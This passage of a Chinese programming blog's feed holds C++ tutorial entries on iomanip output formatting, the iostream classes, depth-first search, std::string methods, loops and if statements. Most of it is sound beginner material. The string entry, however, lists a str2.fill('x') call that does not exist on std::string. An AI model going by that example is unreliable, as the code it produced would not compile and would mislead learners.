class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_output_format</span><span class="params">(std::ostream&amp; os, <span class="type">int</span> precision = <span class="number">2</span>)</span> </span>&#123;</span><br><span class="line">    os &lt;&lt; std::fixed &lt;&lt; std::<span class="built_in">setprecision</span>(precision);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">set_output_format</span>(std::cout);</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> num = <span class="number">123.456789</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Formatted output: &quot;</span> &lt;&lt; num &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>iostream头文件</title>
    <link href="http://example.com/2024/10/15/c%E2%81%84c++/iostream%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/15/c%E2%81%84c++/iostream%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-15T11:10:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>iostream</code>库提供了丰富的功能来控制输出的格式。以下是一些使用<code>iostream</code>库控制输出格式的方法：</p><h3 id="1-主要类："><a href="#1-主要类：" class="headerlink" title="1. 主要类："></a>1. <strong>主要类</strong>：</h3><ul><li><code>std::istream</code>：用于输入操作的抽象基类，提供了基本的输入功能。</li><li><code>std::ostream</code>：用于输出操作的抽象基类，提供了基本的输出功能。</li><li><code>std::iostream</code>：继承自<code>std::istream</code>和<code>std::ostream</code>，用于同时进行输入和输出操作。</li><li><code>std::cin</code>：标准输入流对象，通常与键盘关联，用于接收用户输入。</li><li><code>std::cout</code>：标准输出流对象，通常与屏幕关联，用于向用户显示信息。</li><li><code>std::cerr</code>：标准错误输出流对象，不带缓冲，用于输出错误信息。</li><li><code>std::clog</code>：标准日志流对象，带缓冲，用于输出日志信息。</li></ul><h3 id="2-常用操作符："><a href="#2-常用操作符：" class="headerlink" title="2. 常用操作符："></a>2. <strong>常用操作符</strong>：</h3><ul><li><code>&gt;&gt;</code>：输入操作符，用于从输入流中读取数据。</li><li><code>&lt;&lt;</code>：输出操作符，用于将数据写入输出流。</li></ul><h3 id="3-基本用法："><a href="#3-基本用法：" class="headerlink" title="3. 基本用法："></a>3. <strong>基本用法</strong>：</h3><ul><li>标准输入和输出：通过<code>std::cout</code>输出信息，通过<code>std::cin</code>读取用户输入，实现基本的交互功能。</li><li>标准错误输出：使用<code>std::cerr</code>输出错误信息，不带缓冲，立即显示在屏幕上。</li><li>标准日志输出：使用<code>std::clog</code>输出日志信息，带缓冲，可以与其他输出分开处理。</li></ul><h3 id="4-格式化输出："><a href="#4-格式化输出：" class="headerlink" title="4. 格式化输出："></a>4. <strong>格式化输出</strong>：</h3><ul><li>使用<code>&lt;iomanip&gt;</code>库对输出进行格式化，包括设置宽度、精度和对齐方式。</li><li><code>std::setprecision(int n)</code>：设置浮点数的输出精度为n位小数。</li><li><code>std::setw(int n)</code>：设置输出的最小宽度为n个字符，不足部分用空格填充。</li><li><code>std::left</code>和<code>std::right</code>：设置输出内容的对齐方式，分别为左对齐和右对齐。</li></ul><h3 id="5-流的状态检查："><a href="#5-流的状态检查：" class="headerlink" title="5. 流的状态检查："></a>5. <strong>流的状态检查</strong>：</h3><ul><li>可以检查输入输出流的状态，以确定操作是否成功。</li><li>使用<code>std::cin.fail()</code>检查输入操作是否失败，若失败则输出错误信息。</li></ul><h3 id="6-处理字符串输入："><a href="#6-处理字符串输入：" class="headerlink" title="6. 处理字符串输入："></a>6. <strong>处理字符串输入</strong>：</h3><ul><li>使用<code>std::getline</code>函数读取包含空格的整行输入，适用于读取较长的字符串或包含空格的输入。</li></ul><h3 id="7-综合应用："><a href="#7-综合应用：" class="headerlink" title="7. 综合应用："></a>7. <strong>综合应用</strong>：</h3><ul><li>在实际编程中，可以将以上功能综合应用，实现复杂的输入输出处理。</li><li>例如，通过读取用户输入的数据，进行一系列计算后，将结果格式化输出到屏幕上。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>dfs算法</title>
    <link href="http://example.com/2024/10/14/%E7%AE%97%E6%B3%95/dfs%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2024/10/14/%E7%AE%97%E6%B3%95/dfs%E7%AE%97%E6%B3%95/</id>
    <published>2024-10-14T19:20:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、算法原理"><a href="#一、算法原理" class="headerlink" title="一、算法原理"></a>一、算法原理</h3><p>DFS算法从起始节点开始，沿着一条路径尽可能深地访问下去，直到无法再继续（即到达叶子节点或遇到已访问过的节点），然后回溯到上一个节点，继续探索其他路径。这种方式类似于迷宫中的探索策略，深入一条路直到死胡同，然后返回上一个岔路口继续探索其他路。</p><h3 id="二、实现方法"><a href="#二、实现方法" class="headerlink" title="二、实现方法"></a>二、实现方法</h3><p>DFS算法可以通过递归或显式栈来实现。以下是两种实现方法的简要介绍：</p><ol><li><p><strong>递归实现</strong>：</p><ul><li>选择一个起始节点作为当前节点，并标记为已访问。</li><li>检查当前节点是否满足终止条件（如到达目标节点或无法继续深入），如果满足则返回结果。</li><li>如果不满足终止条件，则遍历当前节点的所有未访问的邻居节点。</li><li>对每个未访问的邻居节点，递归调用DFS函数，将其作为新的当前节点。</li><li>当当前节点的所有邻居节点都被访问过时，回溯到上一层节点。</li></ul></li><li><p><strong>显式栈实现</strong>：</p><ul><li>使用一个栈来保存待访问的节点。</li><li>将起始节点压入栈中，并标记为已访问。</li><li>当栈不为空时，执行以下操作：<ul><li>弹出栈顶节点作为当前节点。</li><li>处理当前节点（如打印、记录等）。</li><li>遍历当前节点的所有未访问的邻居节点，并将它们压入栈中。</li></ul></li></ul></li></ol><h3 id="三、算法特点"><a href="#三、算法特点" class="headerlink" title="三、算法特点"></a>三、算法特点</h3><ol><li><strong>简单易懂</strong>：DFS算法的思想简单，易于理解和实现。</li><li><strong>内存占用小</strong>：DFS使用递归或栈来模拟递归过程，只需要保存当前路径上的节点，因此内存占用较小。</li><li><strong>可解决连通性问题</strong>：对于图，DFS可以用来判断给定的两个节点是否连通。</li><li><strong>寻找可行解</strong>：在搜索问题中，DFS可以被用来寻找一条可行解，通过深度搜索路径来一步步找到目标解。</li><li><strong>没有最优性</strong>：DFS并不保证找到最优解，它只会尽可能往深层次搜索，直到达到终止条件。因此，在某些情况下可能得到次优解。</li><li><strong>可能陷入无限循环</strong>：如果图中存在环路，且没有访问记录的话，DFS可能会陷入无限循环中，导致无法停止。因此，在实际应用中需要特别注意环的检测和处理。</li></ol><h3 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h3><p>DFS算法在各个领域都有广泛的应用，以下是几个典型的应用场景：</p><ol><li><strong>迷宫问题</strong>：通过深度优先搜索的方式，可以递归地探索迷宫中的每个可能路径，直到找到一条通向终点的路径或者所有路径都被探索完毕。</li><li><strong>社交网络分析</strong>：在社交网络中，DFS算法可以用于模拟信息的传播过程。以某个用户为起点，通过深度优先搜索的方式向其关注的用户传播信息，进而影响更多的用户。这有助于理解信息在社交网络中的传播规律和影响力分析。</li><li><strong>数独问题</strong>：通过递归地尝试不同的数字填充空白格子，然后验证是否满足数独的规则，直到找到满足条件的解。这种方法类似于在搜索树中进行深度优先搜索。</li><li><strong>图像处理</strong>：DFS算法可以用于分析图像中的连通性，即判断图像中的像素点是否相互连通。通过从某个起点开始，递归地探索与之相连的像素点，可以确定图像中的不同区域及其连通性。</li><li><strong>拓扑排序</strong>：对有向无环图（DAG）进行拓扑排序时，可以使用DFS算法。通过深度优先搜索的方式，可以得到一个拓扑序列，其中每个节点的出现顺序满足图中的依赖关系。</li></ol><h3 id="五、注意事项"><a href="#五、注意事项" class="headerlink" title="五、注意事项"></a>五、注意事项</h3><ol><li><strong>环检测</strong>：在有向图中使用DFS时，需要特别注意环的存在。为了避免陷入无限循环，可以使用一个访问标记数组来记录已访问过的节点。</li><li><strong>剪枝策略</strong>：有时在DFS中可以通过剪枝策略来减少搜索空间，提高效率。例如，在求解某些问题时，可以提前判断某些路径不可能得到最优解或满足条件，从而提前终止搜索。</li><li><strong>递归深度</strong>：当图的深度非常大时，DFS使用递归实现可能导致堆栈溢出的风险。因此，在实际应用中需要根据具体情况选择合适的算法实现方式（如使用显式栈代替递归）。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="OJ" scheme="http://example.com/tags/OJ/"/>
    
  </entry>
  
  <entry>
    <title>string说明</title>
    <link href="http://example.com/2024/10/10/c%E2%81%84c++/cpp%20string%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/2024/10/10/c%E2%81%84c++/cpp%20string%E7%94%A8%E6%B3%95/</id>
    <published>2024-10-10T21:27:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，<code>std::string</code> 是一个表示和操作字符串的类，定义在 <code>&lt;string&gt;</code> 头文件中。以下是一些常用的 <code>std::string</code> 方法和用法示例：</p><h3 id="1-包含头文件"><a href="#1-包含头文件" class="headerlink" title="1. 包含头文件"></a>1. 包含头文件</h3><p>首先，你需要包含 <code>&lt;string&gt;</code> 头文件：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br></pre></td></tr></table></figure></div><h3 id="2-创建字符串"><a href="#2-创建字符串" class="headerlink" title="2. 创建字符串"></a>2. 创建字符串</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string str1;               <span class="comment">// 默认构造函数，创建一个空字符串</span></span><br><span class="line"><span class="function">std::string <span class="title">str2</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;      <span class="comment">// 用C风格字符串初始化</span></span><br><span class="line"><span class="function">std::string <span class="title">str3</span><span class="params">(str2)</span></span>;         <span class="comment">// 用另一个string对象初始化</span></span><br><span class="line"><span class="function">std::string <span class="title">str4</span><span class="params">(<span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>)</span></span>;       <span class="comment">// 用字符和重复次数初始化，结果为 &quot;ccccc&quot;</span></span><br></pre></td></tr></table></figure></div><h3 id="3-访问字符串中的字符"><a href="#3-访问字符串中的字符" class="headerlink" title="3. 访问字符串中的字符"></a>3. 访问字符串中的字符</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> ch = str2[<span class="number">0</span>];              <span class="comment">// 通过下标访问字符，返回字符的引用</span></span><br><span class="line"><span class="type">char</span> ch2 = str2.<span class="built_in">at</span>(<span class="number">0</span>);          <span class="comment">// 通过at函数访问字符，抛出异常如果下标越界</span></span><br></pre></td></tr></table></figure></div><h3 id="4-字符串长度"><a href="#4-字符串长度" class="headerlink" title="4. 字符串长度"></a>4. 字符串长度</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> len = str2.<span class="built_in">length</span>();     <span class="comment">// 返回字符串的长度</span></span><br><span class="line"><span class="type">size_t</span> size = str2.<span class="built_in">size</span>();      <span class="comment">// 同 length()</span></span><br></pre></td></tr></table></figure></div><h3 id="5-字符串拼接"><a href="#5-字符串拼接" class="headerlink" title="5. 字符串拼接"></a>5. 字符串拼接</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string str5 = str2 + <span class="string">&quot; World&quot;</span>;  <span class="comment">// 使用 + 运算符拼接字符串</span></span><br><span class="line">str2.<span class="built_in">append</span>(<span class="string">&quot;!!!&quot;</span>);                  <span class="comment">// 使用 append 函数追加字符串</span></span><br><span class="line">str2 += <span class="string">&quot; more text&quot;</span>;                <span class="comment">// 使用 += 运算符追加字符串</span></span><br></pre></td></tr></table></figure></div><h3 id="6-字符串比较"><a href="#6-字符串比较" class="headerlink" title="6. 字符串比较"></a>6. 字符串比较</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> cmp = str2.<span class="built_in">compare</span>(str3);       <span class="comment">// 比较两个字符串，返回负值、零或正值</span></span><br><span class="line"><span class="type">bool</span> isEqual = (str2 == str3);      <span class="comment">// 使用 == 运算符比较两个字符串</span></span><br><span class="line"><span class="type">bool</span> isNotEqual = (str2 != str3);   <span class="comment">// 使用 != 运算符比较两个字符串</span></span><br></pre></td></tr></table></figure></div><h3 id="7-字符串查找"><a href="#7-字符串查找" class="headerlink" title="7. 字符串查找"></a>7. 字符串查找</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> pos = str2.<span class="built_in">find</span>(<span class="string">&quot;lo&quot;</span>);       <span class="comment">// 查找子字符串的位置，返回第一个匹配的位置</span></span><br><span class="line"><span class="type">size_t</span> rpos = str2.<span class="built_in">rfind</span>(<span class="string">&quot;o&quot;</span>);      <span class="comment">// 从右向左查找子字符串的位置</span></span><br><span class="line"><span class="type">size_t</span> fpos = str2.<span class="built_in">find_first_of</span>(<span class="string">&quot;aeiou&quot;</span>); <span class="comment">// 查找第一个元音字符的位置</span></span><br><span class="line"><span class="type">size_t</span> lpos = str2.<span class="built_in">find_last_of</span>(<span class="string">&quot;aeiou&quot;</span>);  <span class="comment">// 查找最后一个元音字符的位置</span></span><br><span class="line"><span class="type">size_t</span> npos = str2.npos;            <span class="comment">// 表示未找到的位置（通常是一个很大的值）</span></span><br></pre></td></tr></table></figure></div><h3 id="8-字符串替换"><a href="#8-字符串替换" class="headerlink" title="8. 字符串替换"></a>8. 字符串替换</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string str6 = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">str6.<span class="built_in">replace</span>(<span class="number">6</span>, <span class="number">5</span>, <span class="string">&quot;C++&quot;</span>);          <span class="comment">// 从索引6开始，替换5个字符为 &quot;C++&quot;</span></span><br></pre></td></tr></table></figure></div><h3 id="9-字符串的子串"><a href="#9-字符串的子串" class="headerlink" title="9. 字符串的子串"></a>9. 字符串的子串</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string substr = str2.<span class="built_in">substr</span>(<span class="number">0</span>, <span class="number">5</span>); <span class="comment">// 获取从索引0开始的5个字符的子串</span></span><br></pre></td></tr></table></figure></div><h3 id="10-字符串的插入和删除"><a href="#10-字符串的插入和删除" class="headerlink" title="10. 字符串的插入和删除"></a>10. 字符串的插入和删除</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">str2.<span class="built_in">insert</span>(<span class="number">5</span>, <span class="string">&quot;!!!&quot;</span>);              <span class="comment">// 在索引5处插入字符串 &quot;!!!&quot;</span></span><br><span class="line">str2.<span class="built_in">erase</span>(<span class="number">5</span>, <span class="number">3</span>);                   <span class="comment">// 从索引5开始删除3个字符</span></span><br></pre></td></tr></table></figure></div><h3 id="11-字符串的转换"><a href="#11-字符串的转换" class="headerlink" title="11. 字符串的转换"></a>11. 字符串的转换</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> num = std::<span class="built_in">stoi</span>(str2);          <span class="comment">// 将字符串转换为整数</span></span><br><span class="line"><span class="type">double</span> dnum = std::<span class="built_in">stod</span>(str2);      <span class="comment">// 将字符串转换为双精度浮点数</span></span><br><span class="line">std::string snum = std::<span class="built_in">to_string</span>(<span class="number">123</span>); <span class="comment">// 将整数转换为字符串</span></span><br></pre></td></tr></table></figure></div><h3 id="12-清空字符串"><a href="#12-清空字符串" class="headerlink" title="12. 清空字符串"></a>12. 清空字符串</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">str2.<span class="built_in">clear</span>();                       <span class="comment">// 清空字符串</span></span><br></pre></td></tr></table></figure></div><h3 id="13-字符串的拷贝"><a href="#13-字符串的拷贝" class="headerlink" title="13. 字符串的拷贝"></a>13. 字符串的拷贝</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">std::string str7 = str2.<span class="built_in">c_str</span>();    <span class="comment">// 获取C风格字符串的拷贝（返回 const char*）</span></span><br><span class="line"><span class="type">char</span> arr[<span class="number">20</span>];</span><br><span class="line">str2.<span class="built_in">copy</span>(arr, <span class="number">20</span>, <span class="number">0</span>);              <span class="comment">// 将字符串内容拷贝到字符数组中，最多拷贝20个字符，从索引0开始</span></span><br></pre></td></tr></table></figure></div><h3 id="14-字符串的填充和修改"><a href="#14-字符串的填充和修改" class="headerlink" title="14. 字符串的填充和修改"></a>14. 字符串的填充和修改</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">str2.<span class="built_in">fill</span>(<span class="string">&#x27;x&#x27;</span>);                     <span class="comment">// 用字符 &#x27;x&#x27; 填充整个字符串</span></span><br><span class="line">str2.<span class="built_in">resize</span>(<span class="number">10</span>, <span class="string">&#x27;y&#x27;</span>);               <span class="comment">// 调整字符串大小到10个字符，用 &#x27;y&#x27; 填充新位置</span></span><br></pre></td></tr></table></figure></div><p>这些是 <code>std::string</code> 类中一些常用的方法和功能。C++ 标准库提供了丰富的接口，可以方便地处理字符串的各种操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="c/c++头文件" scheme="http://example.com/categories/c-c/c-c-%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cpp循环用法</title>
    <link href="http://example.com/2024/10/10/c%E2%81%84c++/cpp%E5%BE%AA%E7%8E%AF%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/2024/10/10/c%E2%81%84c++/cpp%E5%BE%AA%E7%8E%AF%E7%94%A8%E6%B3%95/</id>
    <published>2024-10-10T20:30:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，循环语句用于重复执行一段代码直到满足特定条件为止。C++ 提供了几种不同类型的循环结构，包括 <code>for</code> 循环、<code>while</code> 循环和 <code>do-while</code> 循环。以下是对这些循环结构的简要介绍和示例：</p><h3 id="1-for-循环"><a href="#1-for-循环" class="headerlink" title="1. for 循环"></a>1. <code>for</code> 循环</h3><p><code>for</code> 循环通常用于已知循环次数的情况。它的语法结构如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始化表达式; 循环条件; 循环迭代) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，循环将打印从 0 到 9 的整数。</p><h3 id="2-while-循环"><a href="#2-while-循环" class="headerlink" title="2. while 循环"></a>2. <code>while</code> 循环</h3><p><code>while</code> 循环在循环开始前检查条件，如果条件为真，则执行循环体。它的语法结构如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (循环条件) &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，循环也将打印从 0 到 9 的整数。</p><h3 id="3-do-while-循环"><a href="#3-do-while-循环" class="headerlink" title="3. do-while 循环"></a>3. <code>do-while</code> 循环</h3><p><code>do-while</code> 循环与 <code>while</code> 循环类似，但它在循环体执行后才检查条件。这意味着循环体至少会执行一次。它的语法结构如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment">// 循环体</span></span><br><span class="line">&#125; <span class="keyword">while</span> (循环条件);</span><br></pre></td></tr></table></figure></div><p>示例：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt; <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，循环同样将打印从 0 到 9 的整数。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>循环体中的代码将重复执行，直到循环条件变为假（对于 <code>for</code> 和 <code>while</code> 循环）或直到循环体执行后条件变为假（对于 <code>do-while</code> 循环）。</li><li>在 <code>for</code> 循环中，初始化表达式、循环条件和循环迭代都是可选的，但分号和括号是必需的。然而，省略它们通常会导致逻辑错误或无限循环，因此应谨慎使用。</li><li>在使用循环时，务必确保循环能够正常终止，以避免无限循环。这通常意味着要有一个改变循环条件的语句（如递增或递减计数器）。</li><li>在 <code>while</code> 和 <code>do-while</code> 循环中，循环条件通常是一个布尔表达式。如果条件始终为真（例如，没有修改条件的语句），则循环将无限继续。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cpp判定</title>
    <link href="http://example.com/2024/10/10/c%E2%81%84c++/cpp%20if%E5%88%A4%E5%AE%9A/"/>
    <id>http://example.com/2024/10/10/c%E2%81%84c++/cpp%20if%E5%88%A4%E5%AE%9A/</id>
    <published>2024-10-10T20:10:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，<code>if</code> 语句用于基于某个条件执行不同的代码块。它的基本语法结构如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件) &#123;</span><br><span class="line">    <span class="comment">// 如果条件为真，则执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>此外，<code>if</code> 语句还可以与 <code>else</code> 子句结合使用，以便在条件为假时执行另一段代码：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件) &#123;</span><br><span class="line">    <span class="comment">// 如果条件为真，则执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果条件为假，则执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>C++ 还提供了 <code>else if</code> 结构，它允许你检查多个条件，并在满足第一个为真的条件时执行相应的代码块：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果条件1为真，则执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件<span class="number">2</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果条件1为假但条件2为真，则执行这里的代码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果条件1和条件2都为假，则执行这里的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>以下是一个简单的C++程序示例，它使用了 <code>if-else if-else</code> 结构来根据用户输入的分数打印出相应的等级：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;请输入你的分数（0-100）: &quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        